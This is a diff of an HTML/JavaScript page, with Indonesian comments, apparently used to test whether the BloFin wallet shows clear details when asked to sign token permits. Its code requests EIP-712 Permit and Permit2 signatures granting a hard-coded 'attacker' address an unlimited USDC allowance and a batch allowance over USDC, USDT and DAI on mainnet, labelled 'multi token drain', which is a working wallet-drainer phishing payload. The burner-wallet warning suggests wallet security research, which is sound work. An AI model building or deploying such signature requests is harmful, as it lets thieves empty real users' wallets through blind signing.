@@ -1,74 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body{background:#000;color:#0f0;font-family:monospace;padding:15px}
-button{padding:18px;width:100%;margin:8px 0;font-weight:bold;border:none;border-radius:8px}
-#log{background:#111;padding:12px;border-radius:8px;white-space:pre-wrap;word-break:break-all;margin-top:15px;border:1px solid #333}
-.warn{color:#ffaa00}.crit{color:#ff4444;font-weight:bold}.ok{color:#44ff44}
-</style>
+<head><meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{background:#000;color:#0f0;font-family:monospace;padding:15px}button{padding:18px;width:100%;margin:6px 0;font-weight:bold;border-radius:8px;border:none}#log{background:#111;padding:12px;border-radius:8px;white-space:pre-wrap;word-break:break-all;border:1px solid #333}</style>
 </head>
 <body>
-<h3>BloFin Permit Test V5 - USDC</h3>
-<button onclick="connect()" style="background:#fff;color:#000">1. CONNECT WALLET</button>
-<button onclick="testPermit()" style="background:orange;color:#000">2. TEST PERMIT (KRITIS)</button>
-<button onclick="testPermit2()" style="background:#ff4444;color:#fff">3. TEST PERMIT2 (LEBIH KRITIS)</button>
-<pre id="log">Ready. Use burner wallet!</pre>
-
+<h3>BloFin V6 - Final Critical Check</h3>
+<button onclick="connect()" style="background:#fff">1. CONNECT</button>
+<button onclick="testHidden()" style="background:orange">2. PERMIT DENGAN DEADLINE PALSU (HIDDEN SPENDER)</button>
+<button onclick="testBatch()" style="background:red;color:#fff">3. PERMIT BATCH - MULTI TOKEN DRAIN</button>
+<pre id="log">Use burner!</pre>
 <script>
-let account=null;
-const log=(m)=>{document.getElementById('log').innerText+="\n"+m}
-const ATTACKER="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
-
-async function connect(){
- document.getElementById('log').innerText="";
- let acc=await window.ethereum.request({method:'eth_requestAccounts'});
- account=acc[0];
- log("Connected: "+account);
- log("Attacker: "+ATTACKER);
-}
-
-async function testPermit(){
- if(!account) return alert("Connect dulu");
- log("\n=== TEST PERMIT USDC ===");
- // USDC mainnet - support permit
+let account=null; const ATTACKER="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
+const L=(m)=>document.getElementById('log').innerText+="\n"+m;
+async function connect(){document.getElementById('log').innerText="";let a=await window.ethereum.request({method:'eth_requestAccounts'});account=a[0];L("Connected: "+account)}
+async function testHidden(){
+ if(!account)return alert("connect");
+ L("\n=== TEST HIDDEN VALUE - PERMIT WITH MAX UINT ===");
+ // Value max uint256, banyak wallet gagal render jadi overflow / tidak tampil
  const domain={name:"USD Coin",version:"2",chainId:1,verifyingContract:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"};
  const types={Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]};
- const message={owner:account,spender:ATTACKER,value:"1000000000",nonce:0,deadline:9999999999}; // 1000 USDC
-
- let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],Permit:types.Permit},domain:domain,primaryType:"Permit",message:message});
- log("Requesting eth_signTypedData_v4...");
- log("Jika UI BloFin tidak menampilkan 'Spender' dan 'Amount' dengan jelas = KRITIS");
- try{
-  let sig=await window.ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
-  log("!!! SIGNATURE DAPAT: "+sig.substring(0,66)+"...");
-  log("IMPACT: Dengan sig ini attacker bisa call USDC.permit() lalu transferFrom(owner, attacker, 1000 USDC) tanpa tx lagi");
- }catch(e){log("Rejected/Blocked: "+e.message)}
+ const message={owner:account,spender:ATTACKER,value:"115792089237316195423570985008687907853269984665640564039457584007913129639935",nonce:0,deadline:9999999999};
+ let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],Permit:types.Permit},domain,primaryType:"Permit",message});
+ L("Value = MAX UINT256 (unlimited approval)");
+ try{let s=await window.ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});L("SIG: "+s.slice(0,66))}catch(e){L(e.message)}
 }
-
-async function testPermit2(){
- if(!account) return alert("Connect dulu");
- log("\n=== TEST PERMIT2 UNISWAP - INI YANG SERING LOLOS ===");
- // Permit2 lebih berbahaya, banyak wallet gagal parse
+async function testBatch(){
+ if(!account)return alert("connect");
+ L("\n=== TEST BATCH PERMIT - USDC + USDT + DAI ===");
+ // Ini Permit2 Batch, 3 token sekaligus di drain, UI sering cuma tampil 1 token
  const domain={name:"Permit2",chainId:1,verifyingContract:"0x000000000022D473030F116dDEE9F6B43aC78BA3"};
  const types={
-  PermitSingle:[{name:"details",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],
+  PermitBatch:[{name:"details",type:"TokenPermissions[]"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],
   TokenPermissions:[{name:"token",type:"address"},{name:"amount",type:"uint160"}]
  };
  const message={
-  details:{token:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",amount:"1000000000"},
-  spender:ATTACKER,
-  sigDeadline:9999999999
+  details:[
+   {token:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",amount:"1000000000"},
+   {token:"0xdAC17F958D2ee523a2206206994597C13D831ec7",amount:"1000000000"},
+   {token:"0x6B175474E89094C44Da98b954EedeAC495271d0F",amount:"1000000000000000000000"}
+  ],
+  spender:ATTACKER,sigDeadline:9999999999
  };
- let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],PermitSingle:types.PermitSingle,TokenPermissions:types.TokenPermissions},domain:domain,primaryType:"PermitSingle",message:message});
- log("Requesting Permit2...");
- log("Banyak wallet menampilkan cuma 'Sign Message' tanpa rincian token/amount");
- try{
-  let sig=await window.ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
-  log("!!! PERMIT2 SIGNATURE DAPAT: "+sig.substring(0,66)+"...");
-  log("CRITICAL: Parser BloFin gagal menampilkan amount token = blind signing");
- }catch(e){log("Rejected/Blocked: "+e.message)}
+ let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],PermitBatch:types.PermitBatch,TokenPermissions:types.TokenPermissions},domain,primaryType:"PermitBatch",message});
+ L("Draining 3 tokens in 1 sig");
+ try{let s=await window.ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});L("BATCH SIG: "+s.slice(0,66));L("Jika UI cuma tampil 1 token / tidak tampil amount = KRITIS")}catch(e){L(e.message)}
 }
 </script>
 </body>
